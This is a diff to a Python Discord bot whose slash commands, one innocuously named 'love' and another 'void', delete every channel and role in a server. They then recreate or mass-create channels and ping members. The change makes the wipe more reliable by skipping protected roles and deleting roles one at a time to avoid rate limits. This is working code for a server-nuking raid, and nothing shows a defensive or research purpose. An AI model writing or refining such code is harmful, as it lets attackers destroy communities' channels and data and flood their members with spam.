@@ -39,7 +39,8 @@ async def delete_channel(channel):
 
 async def delete_role(role):
     try:
-        await role.delete()
+        if not role.is_default() and not role.managed:
+            await role.delete()
     except Exception:
         pass
 
@@ -55,12 +56,16 @@ async def love(interaction: discord.Interaction, nouveau_nom: str = None):
 
     guild = interaction.guild
 
-    # Supprime tous les salons et rôles en parallèle
-    roles_to_delete = [r for r in guild.roles if not r.is_default() and r.position < guild.me.top_role.position]
-    await asyncio.gather(
-        *[delete_channel(c) for c in guild.channels],
-        *[delete_role(r) for r in roles_to_delete]
-    )
+    # Supprime tous les salons en parallèle
+    await asyncio.gather(*[delete_channel(c) for c in guild.channels])
+
+    # Supprime tous les rôles un par un (Discord rate-limit sur les rôles)
+    for role in guild.roles:
+        if not role.is_default() and not role.managed:
+            try:
+                await role.delete()
+            except Exception:
+                pass
 
     # Recrée un salon "x"
     try:
@@ -138,10 +143,8 @@ async def void(
 
     guild = interaction.guild
 
-    # Supprime tout en parallèle
     await asyncio.gather(*[delete_channel(c) for c in guild.channels])
 
-    # Crée tous les salons en parallèle
     async def create_and_ping(i):
         try:
             channel = await guild.create_text_channel(str(i))
